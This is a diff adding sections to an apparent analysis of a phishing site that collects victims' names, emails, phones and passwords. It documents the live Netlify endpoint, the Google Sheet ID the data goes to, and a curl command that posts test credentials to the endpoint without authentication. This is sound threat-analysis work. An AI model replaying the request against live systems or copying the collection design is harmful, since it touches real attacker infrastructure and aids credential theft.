@@ -98,3 +98,90 @@ The site adapts language based on region, using **Google Translate**, increasing
 ![Page translated based on region](images/transalte.png)
 
 ---
+
+## 6. Data Collection Form
+
+The final step on the website is a form that collects user-provided data.
+
+| Field | Description |
+|------|------------|
+| IP address | Client IP (already known) |
+| Name | Arbitrary input |
+| Email | Victim email |
+| Phone | Victim phone |
+| Password | Victim password |
+
+The user is not informed where this data is stored or how it will be used.
+
+![Data collection form](images/form.png)
+
+---
+
+## 7. Form Submission → Backend Request
+
+When the form is submitted, the browser sends a **POST request** to the backend API.
+
+**Endpoint:**
+
+POST https://zehtevano-preverjanjee.netlify.app/api/sheets
+
+
+This request is made by submiting the form.
+
+![Network request sent on form submission](images/req.png)
+![Network request](images/sheet.png)
+
+---
+
+## 8. Backend API (Netlify Functions)
+
+The `/api/sheets` endpoint is implemented as a **Netlify Serverless Function**.
+
+Its behavior:
+- Accepts incoming form data
+- Appends it to a Google Sheet
+- Does not expose any read, edit, or delete functionality
+
+The API is effectively **write-only**.
+
+---
+
+## 9. Backend Response
+
+After data is stored, the backend returns a minimal success response.
+
+Example response:
+```json
+{
+    "spreadsheetId":"1IiBC-peOD7oUaU2FxUXd2li-0D4lSR8sKu5j00NkGpw",
+    "updates": {
+        "updatedColumns":6,
+        "updatedCells":6,
+        "spreadsheetId":"1IiBC-peOD7oUaU2FxUXd2li-0D4lSR8sKu5j00NkGpw",
+        "updatedRange":"Sheet1!A3563:F3563",
+        "updatedRows":1
+    },
+    "tableRange":"Sheet1!A1:N3562"
+}
+```
+
+This response does not include any previously stored data.
+
+---
+
+## 10. CLI Reproduction (Proof)
+
+The same backend behavior can be reproduced using curl:
+
+```bash
+curl -X POST "https://zehtevano-preverjanjee.netlify.app/api/sheets" \
+  --data-raw "{\"action\":\"append\",\"value\":[[\"215.88.211.158\",\"Ljubljana - Slovenia (SI)\",\"ime\",\"test@example.com\",\"+38612312312\",\"geslo\"]]}"
+```
+
+Successful response confirms:
+
+- Data is accepted without authentication
+- Data is written to Google Sheets
+- The user has no visibility into stored entries
+
+---
